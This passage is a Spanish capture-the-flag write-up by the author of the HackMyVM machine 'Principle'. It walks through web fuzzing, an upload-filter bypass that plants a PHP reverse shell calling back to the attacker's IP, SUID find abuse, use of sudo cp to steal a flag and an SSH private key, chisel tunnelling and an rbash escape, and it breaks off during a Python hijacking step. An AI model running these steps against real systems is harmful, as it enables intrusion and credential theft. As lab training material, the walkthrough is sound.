---
title:      "Principle"
excerpt:    "Resolvemos nuestra primera máquina creada para la comunidad. En ella veremos las típicas técnicas y un port forwarding, para terminar con una escalada con un python library hijacking."
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/principle/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Medium
  - Linux
  - Fuzzing
  - Virtualhost
  - SSH
  - SUID
  - Sudo abuse
  - Python library hijacking
---

![](/assets/images/principle/prev.png){: .align-center}

> ACTUALIZACIÓN: La idea es que la máquina esté actualizada y el write-up también, por ello, se han corregido pequeños errores como el nombre de la flag, que se llame user.txt o el nombre del fichero de la diosa esté en inglés, entre otros detalles.
> [DESCARGA](https://mega.nz/file/QY1VFICB#Uv1v2L4eiZPRB99gXOqk5Ktk_URMuALtwITmij7aLdI)

Este write-up fue escrito el 5 de julio, aunque fue modificado hasta su día de la salida (hoy). Esta es nuestra primera máquina creada para la comunidad. Es un homenaje a uno de los mejores videojuegos de puzles que se han creado, The Talos of Principle, que además cuenta con una historia impresionante y temas filosóficos. En ella veremos las típicas técnicas de siempre, añadiendo un port forwarding y para terminar una escalada con un python library hijacking. La máquina empezó siendo easy, pero parece que terminó siendo más medium...


## Reconocimiento de Puertos

Como es habitual, empezaremos averiguando la IP de la máquina víctima y realizando el reconocimiento de puertos con un pequeño [script](https://github.com/KaianPerez/nmapauto.sh) que creé para automatizar este proceso inicial:

~~~bash
❯ sudo nmapauto

 [*] La IP de la máquina víctima es 192.168.1.23

Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-05 14:53 CEST
Initiating ARP Ping Scan at 14:53
Scanning 192.168.1.23 [1 port]
Completed ARP Ping Scan at 14:53, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:53
Scanning 192.168.1.23 [65535 ports]
Discovered open port 80/tcp on 192.168.1.23
Completed SYN Stealth Scan at 14:53, 26.38s elapsed (65535 total ports)
Nmap scan report for 192.168.1.23
Host is up, received arp-response (0.00015s latency).
Scanned at 2023-07-05 14:53:21 CEST for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:C1:89:36 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
           Raw packets sent: 131091 (5.768MB) | Rcvd: 23 (996B)

 [*] Escaneo avanzado de servicios

Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-05 14:53 CEST
Nmap scan report for debian10.com (192.168.1.23)
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
| http-robots.txt: 1 disallowed entry 
|_/hackme
MAC Address: 08:00:27:C1:89:36 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos 
 ~~~

 Pues aparentemente solo tenemos el puerto HTTP abierto. Además de esto vemos que el servidor web es Nginx y nos indica la existencia de un robots.txt, así que vamos a indagar qué muestra:

![](/assets/images/principle/nginx.png){: .align-center}

- El robots.txt muestra:

~~~
❯ curl $ip/robots.txt
User-agent: *
Allow: /hi.html
Allow: /investigate
Disallow: /hackme
~~~

- /hi.html:

~~~
❯ curl $ip/robots.txt
- Who I am?
- You are a automaton
- Are you sure?
- Yep
- Thank you, who has created me?          
- They say Elohim
~~~

- /investigate:

![](/assets/images/principle/investigate.png){: .align-center}

~~~html
❯ curl $ip/investigate -L
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    
    <title>Principle</title>
</head>
<body>
    <h1 class="h1">The mystery of Talos</h1>
    <div class="center">
        <img class="img" width="750px"  src="talos.jpg" alt="Talos"/>
    </div>
          
        <p class="p">In Greek mythology, Talos was a giant automaton made of bronze which protected Europa in Crete from pirates and invaders. 
He was known to be a gift given to Europa by Zeus himself.
        </p>
</body>
</html>

<!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory -->
~~~

- /hackme: da un 404, no existe.

En el código fuente de /investigate nos insta a realizar fuzzing en ese directorio en busca de documentos, así que vamos a ello:


### Fuzzing

~~~bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -b 403,404 -x php,txt,html -u $ip/investigate
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.25/investigate
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/07/05 23:42:56 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 812]
/rainbow_mystery.txt  (Status: 200) [Size: 568]
Progress: 879529 / 882244 (99.69%)
===============================================================
2023/07/05 23:43:59 Finished
===============================================================
~~~

Hemos localizado un fichero .txt, vamos a ver su contenido:

~~~
❯ curl $ip/investigate/rainbow_mystery.txt
QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
~~~

Parece un mensaje en base64, vamos a decodificarlo:

~~~bash
❯ curl $ip/investigate/rainbow_mystery.txt | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   568  100   568    0     0   152k      0 --:--:-- --:--:-- --:--:--  184k
According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
~~~

Ahora parece que nos da una respuesta en morse, vamos a decodificar el mensaje usando la página <https://morsedecoder.com/es/>:

![](/assets/images/principle/morse.png){: .align-center}

Pues está claro, toca añadir el virtual host en el /etc/hosts: `echo "192.168.1.23    t4l0s.hmv" | sudo tee -a /etc/hosts`

Si ahora resolvemos el dominio:

![](/assets/images/principle/domain.png){: .align-center}

Aquí nos simulan una shell como si nos hablase el Creador.

Si revisamos el código, existe una pista en un comentario: "Elohim is a liar and you must not listen to him, he is not here but it is possible to find him, you must look somewhere else."

Le hacemos caso y realizamos fuzzing nuevamente, pero no encontramos nada. De esta forma, vamos a tratar de descubrir nuevos subdominios:

~~~bash
❯ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u t4l0s.hmv --append-domain -r
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://t4l0s.hmv
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/07/06 00:21:38 Starting gobuster in VHOST enumeration mode
===============================================================
Found: hellfire.t4l0s.hmv Status: 200 [Size: 1659]
Progress: 100000 / 100001 (100.00%)
===============================================================
2023/07/06 00:21:47 Finished
===============================================================
~~~

Añadimos nuevamente el subdominio en la línea del /etc/hosts relativa a esa IP y lo cargamos:

![](/assets/images/principle/hellfire.png){: .align-center}

Revisando el código vemos el siguiente comentario: "You're on the right track, he's getting angry!"

Mientras elohim nos desafía, cada vez vamos recabando más información. De esta forma, parece que un usuario importante del sistema es **elohim** y su directorio de trabajo es **gehenna**.

Vamos a ver si en este nuevo virtual host podemos localizar algún recurso nuevo:

~~~bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -b 403,404 -x php,txt,html -u hellfire.t4l0s.hmv
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hellfire.t4l0s.hmv
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/07/06 00:32:11 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1659]
/upload.php           (Status: 200) [Size: 748]
/output.php           (Status: 200) [Size: 1350]
/archivos             (Status: 301) [Size: 169] [--> http://hellfire.t4l0s.hmv/archivos/]
Progress: 880310 / 882244 (99.78%)
===============================================================
2023/07/06 00:33:17 Finished
===============================================================
~~~

Pues hemos encontrado cositas, si revisamos /upload.php vemos una página para subir ficheros:

![](/assets/images/principle/upload.png){: .align-center}


### Reverse shell

Como ya podéis imaginar, este parece el vector de ataque. Así que intentaremos subir la típica reverse shell de [Pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) que podemos descargar desde esa URL. En nuestro caso como usamos Kali, ya viene incluida (hay que acordarse siempre de poner nuestra IP y el puerto deseado):

~~~bash
❯ locate php-reverse-shell
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
❯ cp /usr/share/webshells/php/php-reverse-shell.php rev.php
❯ nano rev.php
~~~

En este caso, no nos deja subirla así por la cara, nos muestra el error: "The file must be an image (JPEG, PNG or GIF)"

De esta forma, supongo que hay varias formas de bypassearlo, yo lo hago de la siguiente forma:

1. En primer lugar renombro la reverse shell como .jpg: `mv rev.php rev.jpg`
2. Ahora Burpsuite y capturo la petición
3. Renombro el fichero a .php y le doy a Forward

![](/assets/images/principle/burp.png){: .align-center}

![](/assets/images/principle/subido.png){: .align-center}

Pues ya tenemos la reverse shell subida, no se previsualiza la imagen porque obviamente no la hay jeje. Como hemos estado atentos, ya vemos que la imagen se sube al directorio *archivos*.

Solo falta ponernos a la escucha con Netcat `nc -nlvp 1234` y lanzar la shell con http://hellfire.t4l0s.hmv/archivos/rev.php...  ¡y estamos dentro del sistema!

~~~bash
❯ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.1.150] from (UNKNOWN) [192.168.1.23] 38692
Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
 19:00:40 up  1:19,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
~~~

Ahora antes de nada realizamos el [tratamiento de la TTY](https://kaianperez.github.io/tty/) inmediatamente. En esta máquina es vital, si no, no podrás avanzar.

Si nos vamos a /home podemos ver 2 directorios de trabajo, pero sin permisos en ningún fichero, así que aquí no podemos hacer nada:

~~~bash
www-data@principle:/home$ ls -lRa
.:
total 16
drwxr-xr-x  4 root   root   4096 Jul  4 06:11 .
drwxr-xr-x 18 root   root   4096 Jun 30 05:03 ..
drwxr-xr-x  4 elohim elohim 4096 Jul  5 08:21 gehenna
drwxr-xr-x  3 talos  talos  4096 Jul  5 15:54 talos

./gehenna:
total 36
drwxr-xr-x 4 elohim elohim 4096 Jul  5 08:21 .
drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
-rw-r----- 1 elohim elohim    1 Jul  5 08:24 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5 08:13 .bash_logout
-rw-r----- 1 elohim elohim 3814 Jul  4 05:46 .bashrc
drw-r----- 3 elohim elohim 4096 Jul  2 20:52 .local
-rw-r----- 1 elohim elohim   11 Jul  6 11:01 .lock
-rw-r----- 1 elohim elohim  840 Jul  2 20:22 .profile
drwx------ 2 elohim elohim 4096 Jul  5 08:22 .ssh
-rw-r----- 1 elohim elohim  777 Jul  4 06:26 flag.txt
ls: cannot open directory './gehenna/.local': Permission denied
ls: cannot open directory './gehenna/.ssh': Permission denied

./talos:
total 36
drwxr-xr-x 3 talos talos 4096 Jul  5 15:54 .
drwxr-xr-x 4 root  root  4096 Jul  4 06:11 ..
-rw-r----- 1 talos talos    1 Jul  5 08:26 .bash_history
-rw-r----- 1 talos talos  261 Jul  5 07:56 .bash_logout
-rw-r----- 1 talos talos 3526 Jun 30 05:06 .bashrc
-rw------- 1 talos talos   20 Jul  4 18:24 .lesshst
drw-r----- 3 talos talos 4096 Jun 30 07:30 .local
-rw-r----- 1 talos talos  807 Jun 30 05:06 .profile
-rw-r----- 1 talos talos  286 Jul  5 15:54 note.txt
ls: cannot open directory './talos/.local': Permission denied
~~~

Como somos el usuario www-data y no tenemos asignada una shell, vamos a revisar los binarios que existen con permisos SUID a ver si nos podemos aprovechar:

~~~bash
www-data@principle:/$ find / -perm -4000 -ls 2>/dev/null
    17610     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8 08:21 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    26824    640 -rwsr-xr-x   1 root     root         653888 Feb  8 05:43 /usr/lib/openssh/ssh-keysign
      368     64 -rwsr-xr-x   1 root     root          62672 Mar 23 08:40 /usr/bin/chfn
      371     88 -rwsr-xr-x   1 root     root          88496 Mar 23 08:40 /usr/bin/gpasswd
     2366     60 -rwsr-xr-x   1 root     root          59704 Mar 23 06:02 /usr/bin/mount
      372     68 -rwsr-xr-x   1 root     root          68248 Mar 23 08:40 /usr/bin/passwd
    31649    276 -rwsr-xr-x   1 root     root         281624 Mar  8 15:17 /usr/bin/sudo
     2293    220 -rwsr-xr-x   1 talos    root         224848 Jan  8 13:07 /usr/bin/find
     4689     72 -rwsr-xr-x   1 root     root          72000 Mar 23 06:02 /usr/bin/su
      369     52 -rwsr-xr-x   1 root     root          52880 Mar 23 08:40 /usr/bin/chsh
     2368     36 -rwsr-xr-x   1 root     root          35128 Mar 23 06:02 /usr/bin/umount
      598     48 -rwsr-xr-x   1 root     root          48896 Mar 23 08:40 /usr/bin/newgrp
~~~

Bueno, ahí vemos en primera instancia que hay un binario que pertenece a **talos**, que es nada más y nada menos que *find*. De esta forma, vamos como siempre a nuestro buen amigo <https://gtfobins.github.io/gtfobins/find/#suid> y vamos a explotarlo:

~~~bash
www-data@principle:/home$ cd /usr/bin/    
www-data@principle:/usr/bin$ ./find . -exec /bin/bash -p \; -quit
bash-5.2$ id
uid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)
~~~

Bien, nos hemos convertido en talos, así que vamos a ver qué nos encontramos en su directorio de trabajo:

~~~bash
bash-5.2$ cd /home/talos
bash-5.2$ ls
note.txt
bash-5.2$ cat note.txt 
Congratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!
Now we are very close to finding this false God Elohim.
I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)
The tool I left you is still your ally. Good luck to you.
~~~

Siguiendo con el lore de la antigua Grecia nos habla de los 12 Dioses del Olimpo, por lo que realizando una búsqueda en Google podemos copiarlos directamente a un archivo de texto. De esta forma, crearemos un script que nos realice un find para cada línea del listado:

~~~
bash-5.2$ cat dioses.txt 
Zeus
Hera
Athena
Apollo
Poseidon
Ares
Artemis
Demeter
Aphrodite
Dionysos
Hermes
Hephaistos
~~~

Aquí hago un inciso, y es que en forma de script no me dio funcionado, supongo que es por la pseudo-consola, así que lo realizaremos en un one liner (más rápido aún):

~~~bash
bash-5.2$ for line in $(cat dioses.txt); do find / -iname "*$line*" -ls 2>/dev/null >> resultados.txt; done 
bash-5.2$ cat resultados.txt
    14321     20 -rw-r--r--   1 root     root        18195 May  8 16:16 /usr/lib/modules/6.1.0-9-amd64/kernel/drivers/power/supply/cros_peripheral_charger.ko
     4312      4 -rw-r--r--   1 root     root          164 May 28 15:54 /usr/share/zoneinfo/Antarctica/Rothera
     6909      4 -rw-r--r--   1 root     root          698 May 28 15:54 /usr/share/zoneinfo/right/Antarctica/Rothera
    32381      4 -rwxr--r--   1 root     root          237 Jul  5 05:43 /etc/selinux/Aphrodite.key
     4469      4 -rw-r--r--   1 root     root         2184 May 28 15:54 /usr/share/zoneinfo/Europe/Bucharest
     7661      4 -rw-r--r--   1 root     root         2318 May 28 15:54 /usr/share/zoneinfo/right/Europe/Bucharest
~~~

Pues ahí vemos un fichero creado por nuestro amigo talos con el nombre del Dios en cuestión, veamos su contenido:

~~~
bash-5.2$ cat /etc/selinux/.Aphrodite
Here is my password:
Hax0rModeON

Now I have done another little trick to help you reach Elohim.
REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.
~~~

Nos da su contraseña, para que podamos convertirnos en él con todas las de la ley.

Ahora que ya somos (al fin) un usuario "normal", ya podemos ver también los comandos que podemos ejecutar como otro usuario:

~~~bash
bash-5.2$ su talos
Password: 
talos@principle:~$ sudo -l
Matching Defaults entries for talos on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User talos may run the following commands on principle:
    (elohim) NOPASSWD: /bin/cp
~~~

> Como echaba de menos volver a tener el prompt normal, y ahora con "talos@principle" ya le hace un guiño total a ese videojuego de finales de 2014 cuya secuela se espera este año... 

Volviendo al tema, parece que ya tenemos a nuestro querido farsante elohim en el punto de mira, vamos a por él, sin compasión.

Por tanto, como tenemos permisos de *cp* como elohim, vamos a copiarnos la flag de su directorio de trabajo al nuestro.

Hay que tener en cuenta que no tenemos permisos sobre ese fichero, de forma que no podemos "copiarlo" como tal ya que nos dará error. Sin embargo, si existe una triquiñuela que es generar el nombre del fichero primeramente para que entonces el sistema le haga un "append" del contenido que queremos copiar:

> También se puede copiar directamente al /dev/stdout para leer directamente los ficheros en consola.

~~~bash
talos@principle:~$ touch user.txt
talos@principle:~$ sudo -u elohim cp /home/gehenna/user.txt .
talos@principle:~$ cat user.txt 
                           _
                          _)\.-.
         .-.__,___,_.-=-. )\`  a`\_
     .-.__\__,__,__.-=-. `/  \     `\
     {~,-~-,-~.-~,-,;;;;\ |   '--;`)/
      \-,~_-~_-,~-,(_(_(;\/   ,;/
       ",-.~_,-~,-~,)_)_)'.  ;;(
         `~-,_-~,-~(_(_(_(_\  `;\
   ,          `"~~--,)_)_)_)\_   \
   |\              (_(_/_(_,   \  ;
   \ '-.       _.--'  /_/_/_)   | |
    '--.\    .'          /_/    | |
        ))  /       \      |   /.'
       //  /,        | __.'|  ||
      //   ||        /`    (  ||
     ||    ||      .'       \ \\
     ||    ||    .'_         \ \\
      \\   //   / _ `\        \ \\__
       \'-'/(   _  `\,;        \ '--:,
        `"`  `"` `-,,;         `"`",,;


CONGRATULATIONS, you have defeated me!

The flag is:
K|*************jN
~~~

Tenemos la flag de user, y llegamos al punto más complicado de la máquina, tenemos permisos de *cp* como elohim pero no sabemos qué hacer más aparte de copiar la flag que ya hemos hecho. No vemos otros vectores de escalada de privilegios... ¿o sí?


## Escalada de privilegios

Si recordamos había un directorio .ssh en el directorio de trabajo de elohim, sin embargo, solo tenemos el puerto 80 accesible desde fuera... Indaguemos esto bien:

~~~bash
talos@principle:~$ ss -tunel
Netid       State        Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       Process                                                             
udp         UNCONN       0             0                          0.0.0.0:68                      0.0.0.0:*           ino:14135 sk:1 cgroup:/system.slice/ifup@enp0s3.service 
tcp         LISTEN       0             128                        0.0.0.0:3445                    0.0.0.0:*           ino:14526 sk:2 cgroup:/system.slice/ssh.service          
tcp         LISTEN       0             511                        0.0.0.0:80                      0.0.0.0:*           ino:14468 sk:3 cgroup:/system.slice/nginx.service        
tcp         LISTEN       0             128                           [::]:3445                       [::]:*           ino:14528 sk:5 cgroup:/system.slice/ssh.service  
tcp         LISTEN       0             511                           [::]:80                         [::]:*           ino:14469 sk:6 cgroup:/system.slice/nginx.service  
talos@principle:~$ ls -la /home/gehenna
total 36
drwxr-xr-x 4 elohim elohim 4096 Jul  5 08:21 .
drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
-rw-r----- 1 elohim elohim    1 Jul  5 08:24 .bash_history
-rw-r----- 1 elohim elohim  261 Jul  5 08:13 .bash_logout
-rw-r----- 1 elohim elohim 3814 Jul  4 05:46 .bashrc
-rw-r----- 1 elohim elohim  777 Jul  4 06:26 user.txt
drw-r----- 3 elohim elohim 4096 Jul  2 20:52 .local
-rw-r----- 1 elohim elohim   11 Jul  6 11:01 .lock
-rw-r----- 1 elohim elohim  840 Jul  2 20:22 .profile
drwx------ 2 elohim elohim 4096 Jul  5 08:22 .ssh
~~~


### Remote port forwarding

Confirmamos que sí está corriendo el servicio SSH por el puerto 3445 y todo apunta que elohim tiene una clave privada, así que vamos a robársela y darle los permisos adecuados.

~~~bash
talos@principle:~$ touch id_rsa
talos@principle:~$ chmod 666 id_rsa 
talos@principle:~$ sudo -u elohim cp /home/gehenna/.ssh/id_rsa .
talos@principle:~$ chmod 600 id_rsa
~~~

Ahora como el puerto no está expuesto hacia fuera, tratamos de conectarnos con la misma vía local:

~~~bash
talos@principle:~$ ssh -i id_rsa -p 3445 elohim@localhost
bash: /usr/bin/ssh: Permission denied
~~~

Esto no funciona, así que tenemos que realizar un remote port forwarding sin SSH.

> Se podría copiar el binario de ssh de nuestra máquina atacante, como alternativa.

> También podríamos copiar nuestra clave pública desde nuestra máquina atacante al authorized_keys.

En este caso utilizaré chisel, que es lo que suelo usar en estos casos. Como ya tenemos su clave privada, copiamos su contenido y creamos un fichero con el mismo en nuestro equipo, sin olvidarse de darle los permisos adecuados con `chmod 600 id_rsa`.

Como siempre, en estos casos crearemos un [servidor en Python](https://kaianperez.github.io/server/) para copiar el chisel a la máquina víctima.

Ahora adjunto una captura de la conexión con chisel (acordarse siempre de dar el permiso de ejecución):

![](/assets/images/principle/chisel.png){: .align-center}

Una vez establecida la conexión, desde la máquina atacante nos conectaremos desde otra ventana de forma "local" a la máquina víctima por SSH cargando la clave robada:

~~~bash
❯ ssh -p 3445 -i id_rsa elohim@localhost
Enter passphrase for key 'id_rsa': 
~~~

Si recordamos la pista que nos dieron ("REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home."), ya tenemos la llave (id_rsa) y hemos abierto la puerta de entrada (remote port forwarding), pero nos falta el "lock/cerrojo". Si nos hemos fijado, existe un fichero llamado .lock en la carpeta de trabajo de elohim. Vamos a robárselo también:

~~~bash
talos@principle:~$ touch .lock
talos@principle:~$ sudo -u elohim cp /home/gehenna/.lock .
talos@principle:~$ cat .lock
7072696e6369706c6573
~~~

Parece que se trada de una codificación en hexadecimal, la copiamos a un fichero de nuestra máquina:

~~~
❯ xxd -r -ps < hexa
principles
~~~

Bien, pues esta será la "passphrase" que nos pide la clave al acceder, así que ya lo tenemos todo, vamos a por ello:

> La passphrase se podría sacar con john, pues está en rockyou.txt, pero tardaría bastante.

~~~bash
❯ ssh -p 3445 -i id_rsa elohim@localhost
Enter passphrase for key 'id_rsa': 
Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

                                 ...',;;:cccccccc:;,..
                            ..,;:cccc::::ccccclloooolc;'.
                         .',;:::;;;;:loodxk0kkxxkxxdocccc;;'..
                       .,;;;,,;:coxldKNWWWMMMMWNNWWNNKkdolcccc:,.
                    .',;;,',;lxo:...dXWMMMMMMMMNkloOXNNNX0koc:coo;.
                 ..,;:;,,,:ldl'   .kWMMMWXXNWMMMMXd..':d0XWWN0d:;lkd,
               ..,;;,,'':loc.     lKMMMNl. .c0KNWNK:  ..';lx00X0l,cxo,.
             ..''....'cooc.       c0NMMX;   .l0XWN0;       ,ddx00occl:.
           ..'..  .':odc.         .x0KKKkolcld000xc.       .cxxxkkdl:,..
         ..''..   ;dxolc;'         .lxx000kkxx00kc.      .;looolllol:'..
        ..'..    .':lloolc:,..       'lxkkkkk0kd,   ..':clc:::;,,;:;,'..
        ......   ....',;;;:ccc::;;,''',:loddol:,,;:clllolc:;;,'........
            .     ....'''',,,;;:cccccclllloooollllccc:c:::;,'..
                    .......'',,,,,,,,;;::::ccccc::::;;;,,''...
                      ...............''',,,;;;,,''''''......
                           ............................


Son, you didn't listen to me, and now you're trapped.
You've come a long way, but this is the end of your journey.

elohim@principle:~$ 
~~~


### Escapando de rbash

Al fin vemos el ojo de Elohim y no cesan sus amenazas, nos dice que estamos atrapados. Cierto es que si intentamos hacer comandos básicos como cd, cat, nano... no nos permite, ni siquiera tabular.

> Si intentamos conectarnos por SSH con `ssh-t "bash --noprofile --norc"` para saltárnosla, no funciona.

Estamos bajo una "restricted shell" (rbash), por lo que propongo una forma de escapar de este contexto utilizando vi. No obstante, vemos que vi tampoco funciona...
Lo que ocurre es que estamos bajo varios alias de dichos comandos, lo que podemos solucionar simplemente realizando un `unalias "comando deseado"`.

Una vez ya nos permite acceder a vi debemos introducir `:set shell=/bin/bash` y acto seguido `:shell`. Con esto habremos escapado de dicho contexto.

Al poco vemos que nos sale un mensaje indicando:

~~~
Broadcast message from root@principle (somewhere) (Thu Jul  6 15:05:01 2023):  
                                                                               
I have detected an intruder, stealing accounts: elohim
~~~

Ahora ya es root el que sabe de nuestra presencia. Vamos a indagar cómo podemos escalar privilegios.

> Es importante quitar todos los alias de los comandos que no funcionen, pues al salir del rbash se vuelven a activar.

Si revisamos con este usuario los comandos que podemos ejecutar como otro:

~~~bash
elohim@principle:/opt$ sudo -l
Matching Defaults entries for elohim on principle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elohim may run the following commands on principle:
    (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
~~~

Y si miramos el /etc/crontab vemos lo siguiente:

~~~bash
elohim@principle:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*/5 * * * * root  /opt/reviewer.py
17 *  * * * root  cd / && run-parts --report /etc/cron.hourly
25 6  * * * root  test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6  * * 7 root  test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6  1 * * root  test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
~~~


### Python library hijacking

Si revisamos esa tarea cron:

~~~python
elohim@principle:~$ ls -l /opt/reviewer.py 
-rwxr-xr-x 1 root root 1340 Jul  6 10:44 /opt/reviewer.py
elohim@principle:~$ cat /opt/reviewer.py 
#!/usr/bin/python3

import os
import subprocess

def eliminar_archivos_incorrectos(directorio):
    extensiones_validas = ['.jpg', '.png', '.gif']
    
    for nombre_archivo in os.listdir(directorio):
        archivo = os.path.join(directorio, nombre_archivo)
        
        if os.path.isfile(archivo):
            _, extension = os.path.splitext(archivo)
            
            if extension.lower() not in extensiones_validas:
                os.remove(archivo)
                print(f"Archivo eliminado: {archivo}")

# Directorio donde se eliminarán los archivos incorrectos
directorio = '/var/www/hellfire.t4l0s.hmv/archivos'

eliminar_archivos_incorrectos(directorio)

def enviar_mensaje_usuarios_conectados():
    # Obtener lista de usuarios conectados usando el comando 'who'
    proceso = subprocess.Popen(['who'], stdout=subprocess.PIPE)
    salida, _ = proceso.communicate()
    lista_usuarios = salida.decode().strip().split('\n')
    
    # Extraer los nombres de usuario de la lista
    usuarios_conectados = [usuario.split()[0] for usuario in lista_usuarios]
    
    # Construir el mensaje a enviar
